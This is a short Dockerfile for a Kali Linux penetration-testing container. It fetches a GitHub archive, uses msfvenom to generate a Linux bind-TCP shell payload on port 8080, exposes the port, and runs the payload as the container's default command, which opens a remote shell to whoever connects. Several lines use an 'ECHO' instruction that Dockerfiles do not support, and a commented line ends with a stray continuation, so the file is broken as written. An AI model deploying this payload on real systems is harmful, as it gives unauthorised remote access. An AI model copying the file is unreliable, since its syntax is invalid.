FROM kalilinux/kali-linux-docker
MAINTAINER Pentester

#ENV PKG_JSON_URL=https://raw.githubusercontent.com/ptitdoc/dockersploit/master/package.json\
ENV TAR_GZ_URL=https://github.com/ptitdoc/dockersploit/archive/master.tar.gz \
    BUILD_DEPS='gcc g++ git make python bash'

ECHO "HTTP Proxy: $http_proxy"
ECHO "HTTPS Proxy: $https_proxy"
ECHO "Pentest: $pentest"

ECHO "Creating directories"

RUN mkdir -p /pentest
RUN mkdir -p /pentest-data
WORKDIR /pentest

ECHO "Decompressing GIT"

#ADD $PKG_JSON_URL ./package.json
ADD $TAR_GZ_URL ./master.tar.gz
RUN set -x \
&& tar -xzvf master.tar.gz

ECHO "Running MSFVENOM"
RUN msfvenom --platform linux -p linux/x64/shell/bind_tcp lport=8080 -f elf -o payload

ECHO "Creating user"
RUN groupadd -r pentest \
&& useradd -r -g pentest pentest \
&& chown pentest:pentest /pentest-data

ECHO "Docker configuration"
USER pentest 

EXPOSE 8080

#VOLUME ["/pentest-data"]

CMD ["/pentest/payload"]
